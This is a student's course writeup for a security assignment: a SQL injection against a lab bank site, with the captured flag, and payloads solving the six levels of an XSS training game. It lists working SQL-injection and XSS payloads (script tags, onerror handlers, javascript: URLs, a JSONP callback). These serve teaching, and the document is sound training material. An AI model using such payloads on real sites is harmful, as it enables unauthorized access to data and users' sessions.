# Crypto II Writeup

Name: *Japneet Singh Arora*
Section: *0101*

I pledge on my honor that I have not given or received any unauthorized
assistance on this assignment or examination.

Digital acknowledgement: *Japneet Singh Arora*

## Assignment Writeup

### Part 1 (40 Pts)
I found the flag to be `CMSC389R-{y0u_ar3_th3_SQ1_ninj@}`. I did this by showing all items on the website with a statement that is always true in the url `http://1337bank.money:5000/item?id='||'1'='1`.

### Part 2 (60 Pts)
1.  `<script>alert("lolol");</script>`. Tried inserting this into the searchbar and this displayed the script as a query.

2.  `<img src="" onerror="alert('lolol')"></img>`. After spending some time on this i realised that i could use the onerror attribute, which would throw an erorr every time the page was loaded. This was possible using the image tag.

3.  `https://xss-game.appspot.com/level3/frame#1' onerror='alert("lolol")'`. Subsituted the value of num to a string literal and also added the onerror attribute to trigger the popup.

4.  `'); alert('xss`. I saw that we can inject a popup dialogue by closing the start time function and a call to alert().

5.  `https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert('lolol');`. After pressing the sign up button, the url changed to signup?next=confirm. So i set the url after next to a javascript alert.

6.  `https://xss-game.appspot.com/level6/frame#//google.com/jsapi?callback=alert`. Played with this for a while and later found an API that would bring up the alert.